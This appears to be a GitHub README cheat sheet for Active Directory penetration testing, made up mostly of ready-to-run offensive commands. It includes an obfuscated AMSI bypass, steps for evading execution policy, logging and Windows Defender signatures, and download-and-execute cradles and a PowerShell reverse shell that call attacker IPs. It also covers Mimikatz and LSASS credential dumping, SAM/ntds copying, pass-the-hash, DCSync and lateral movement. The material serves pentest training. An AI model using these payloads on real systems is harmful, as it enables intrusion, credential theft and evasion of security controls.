
<h1>Active Directory Pentest</h1>

<h2>Help Menue of any PS1 script: </h2>

![image](https://github.com/Anub1s1999/Active-Directory-Pentesting-Suit/assets/91386350/619617b7-5b0a-43bc-8a0e-32b00c3cb2b0)


<h2>Basic PS commands to start</h2>


	Get-Help * #List everything loaded
	Get-Help process #List everything containing "process"
	Get-Help Get-Item -Full #Get full helpabout a topic
	Get-Help Get-Item -Examples #List examples
	Import-Module <modulepath>
	Get-Command -Module <modulename>


<h2>Components:</h2>

![Capture](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/1039ece9-48a7-4028-903d-831b1a31ee91)

<h2>Detections:</h2>

![Capture_Detections](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/80f90de4-7467-4a32-8fc9-5aa46e8943fb)

<h2>Bypassing Execution Policy:</h2>
	
 	*It is NOT a security measure, it is present to prevent user from 
		accidently executing scripts.
 	*Several ways to bypass
		powershell –ExecutionPolicy bypass
		powershell –c <cmd>   ////Only Commands
		powershell –encodedcommand $env:PSExecutionPolicyPreference="bypass"
<h2>Bypassing PowerShell Security:</h2>
	
 	use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell. The tool hooks the .NET assemblies (System.Management.Automation.dll and System.Core.dll) to bypass logging
	
 	It uses a CLR Profiler API to perform the hook. "A common language runtime (CLR) profiler is a dynamic link library (DLL) that consists of functions that receive messages from, and send messages to, the CLR by using the profiling API. The profiler DLL is loaded by the CLR at run time."

<h2>Bypassing AV Signatures for PowerShell:</h2>
	
 	*load scripts in memory and avoid detection using AMSI bypass.
		How do we bypass signature based detection of on-disk PowerShell scripts by Windows Defender?
  			>We can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected. Simply provide path to the script file to scan it:
				AmsiTrigger_x64.exe -i <"Path To The Script for testing it">
	*For full obfuscation of PowerShell scripts:
 		>see Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation).
 ![Example-BypassingAV](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/814cdce0-f2aa-4f65-b56e-8111ea86f84f)


<h2>Bypassing AV Signatures for PowerShell - Via loading scripts in Memory</h2>

		powershell.exe -nop -exec bypass "IEX (New-Object Net-WebClient).Downloadstring('http://IP:Port/<Script.PS1>')"
  		iex (iwr http://IP:Port/<Bypassing-Code.txt> -UseBasicParsing)

		

 <h2>AMSI Bypassing</h2>

 	powershell -version 2.0

  	$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

	[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
	
  	S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
   
 <h3>Using Obfuscation</h3>
		You can use simple obfuscation like summing strings like this:
  			
	"In"+"vo"+"ke"+"-M"+"im"+"ik"+"at"+"z"

 
	
<h2>Offensive .NET - Tradecraft - AV bypass</h2>

	• We can use DefenderCheck (https://github.com/matterpreter/DefenderCheck) to identify code and strings from a binary that Windows Defender may flag.

 ![image](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/3cfb9039-d958-48b2-94b2-c008d80b3054)

<h2>Offensive .NET - Tradecraft - AV bypass -String Manipulation</h2>

	• Open the project in Visual Studio.
	• Press "CTRL + H".
	• Find and replace the string "Credentials" with "Credents" you can use any other string as an replacement. (Make sure that string is not present in the code)
	• Select the scope as "Entire Solution".
	• Press "Replace All" button.
	• Build and recheck the binary with DefenderCheck.
	• Repeat above steps if still there is detection

 
	For SafetyKatz, we used the following steps;
		• Download latest version of Mimikatz and Out-CompressedDll.ps1
		• Run the Out-CompressedDll.ps1 PowerShell script on Mimikatz binary and save the output to a file.
			Out-CompressedDll <Path to mimikatz.exe> > outputfilename.txt

![image](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/72d1c970-2385-446d-807e-3568ae5b7802)

![image](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/b3bee223-0c4e-444d-beec-6ae5da1dca49)

<h2>Offensive .NET - Tradecraft - AV bypass -BetterSafetyKatz</h2>

![image](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/e3d1b5ba-9fba-4894-999b-334ee2ea77e4)

![image](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/87ff679f-a054-490e-b60a-bd9f681e43a5)



<h2>Offensive .NET - Tradecraft - AV bypass - Obfuscation</h2>

	• For Rubeus.exe, we used ConfuserEx (https://github.com/mkaring/ConfuserEx) to obfuscate the binary.

![image](https://github.com/Anub1s1999/WindowsExecutables/assets/91386350/3dd37376-9dd7-484e-a42c-02d2b5c7bf5b)


  	Launch ConfuserEx
		• In Project tab select the Base Directory where the binary file is located.
		• In Project tab Select the Binary File that we want to obfuscate.
		• In Settings tab add the rules.
		• In Settings tab edit the rule and select the preset as `Normal`.
		• In Protect tab click on the protect button.
	We will find the new obfuscated binary in the Confused folder under the Base Directory.


<h2>Offensive .NET - Tradecraft - Payload Delivery</h2>

	• We can use NetLoader (https://github.com/Flangvik/NetLoader) to deliver our binary payloads. 
 	• It can be used to load binary from filepath or URL and patch AMSI & ETW while executing. 
		C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe 
	• We also have AssemblyLoad.exe that can be used to load the Netloader in memory from a URL which then loads a binary from a filepath or URL. 
		C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
  	• Via Winrs session (Requiring A local Admin Access on the Target OR /ptt Ticket Pathed) 
   		echo F | xcopy C:\Users\Public\Loader.exe \\<Target-Machine>\C$\Users\Pub1ic\Loader.exe
	Via Winrs + PortForwarding (Less noisy) (Requiring A local Admin Access on the Target OR /ptt Ticket Pathed)
 		$nu11 | winrs -r:<Target-Machine> "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<AttackerIP>"
   		$null I winrs -r:<Target-Machine> C:\Users\Pub1ic\Loader.exe -path http://127.0.0.0:8080/SafetyKatz.exe sekurlsa::ekeys exit
     			///Note that our attacker webserver should be running on port 80, On the target: Our 8080 Port is Hooked to Port 80 of our Attacking WebServer.

<h2>File Download</h2>

	powershell -c "Invoke-WebRequest -Uri 'http://10.9.2.209:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

  <h2>Local Privilege Escalation</h2>

	– PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
	– Privesc: https://github.com/enjoiz/Privesc
 		– PowerUp
			Invoke-AllChecks
      		• Get services with unquoted paths and a space in their name.
				Get-ServiceUnquoted -Verbose
			• Get services where the current user can write to its binary path or change arguments to the binary
				Get-ModifiableServiceFile -Verbose
			• Get the services whose configuration current user can modify.
				Get-ModifiableService -Verbose
		– Privesc:
			Invoke-PrivEsc
		– PrivescCheck:
			Invoke-Privesc Check
		– PEASS-ng:
			winPEASx64.exe

<h2>Stealing Windows Credentials</h2>


		#Elevate Privileges to extract the credentials
			privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
			token::elevate
		#Extract from lsass (memory)
			sekurlsa::logonpasswords
		#Extract from lsass (service)
			lsadump::lsa /inject
		#Extract from SAM
			lsadump::sam
		#One liner
			mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
   
   		Invoke-Mimikatz -DumpCreds #Dump creds from memory
		Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
  		#Also use the PS script Invoke-NinjaCopy to make a copy of SAM, SYSTEM and ntds.dit.
			Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"

   <h2>Reverse Shells</h2>

    powershell iex (iwr -UseBasicParsing http://<Attacker IP>/Invoke-PowerShe11Tcp.ps1); power -Reverse -ipaddress <IP for reverse connection> -port <Reverse connection Port>
    powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

<h2>Lateral Movement - Extracting Credentials from LSASS</h2>

	• Dump credentials on a local machine using Mimikatz.
		Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 
	• Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
		SafetyKatz.exe "sekurlsa::ekeys" 
	• Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
		SharpKatz.exe --Command ekeys
	• Dump credentials using Dumpert (Direct System Calls and API unhooking)
		rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
	• Using comsvcs.dll
 		tasklist /FI "IMAGENAME eq lsass.exe"
   		rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
     		C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
       			//Load the dump
				mimikatz # sekurlsa::minidump lsass.dmp


<h2>Lateral Movement - Injecting NTLMv1 Hashes, aes256</h2>

	Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
		Invoke-Mimikatz -Command '"sekurlsa::pth /user:<UserFound> /domain:<domain.domain> /aes256:<aes256key> /run:powershell.exe"'
  		Invoke-Mimikatz -Command '"sekurlsa::pth /user:<UserFound> /domain:<domain.domain> /ntlm:<NTLMv1 Hash> /run:powershell.exe"'
		SafetyKatz.exe "sekurlsa::pth /user:<User Found> /domain:<Domain.Domain> /aes256:<aes256Key> /run:cmd.exe" "exit"

   <h4>OR (No Need For Elevation, Other words no local admin access is needed)</h4>
   
    Rubeus.exe asktgt /user:<UserFound> /rc4:<NTLMv1 Hash> /ptt
		.\PsExec.exe -accepteula \\<Host> cmd
  
<h4>OR (Need For Elevation, Other words local admin access is needed)</h4>

 	Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt


<h2>Lateral Movement - DCSync (Requires DA Privileges OR a misconfigured ACLs)</h2>


 	Invoke-Mimikatz -Command '"1sadump::dcsync /user:us\krbtgt"'
	SafetyKatz.exe "1sadump::dcsync /user:us\krbtgt" "exit"
 

<h2>Lateral Movement - Having a local admin access</h2>

	Enter-PsSession <computername>            ////Makes Process called wsmprovhost
 	Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName {cat С:\Users\TestUser\Desktop\ListOfComputers.txt}           /////Interacting With Multiple Computers
  	Invoke-command -scriptblock {Get-Process} -ComputerName (Get-Content  <listOfServers>)
   	Invoke-Command —Filepath C:\scripts\Get-PassHashes.psl -ComputerName (Get-Content  <listOf—servers>)
    	
     	$sess= New-PSSession -Computername Comp1
      	Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
       	Invoke-Command -Session $sess -ScriptBlock {$Proc.Name}

 
   <h3>Or Via Patch</h3>

  	$testVar= New-PsSession <Computername>
   	Enter-PsSession $testVar




</br></br></br></br></br></br></br></br></br></br></br></br>
<h1>Resources</h1>

	https://lolbas-project.github.io/
 	https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
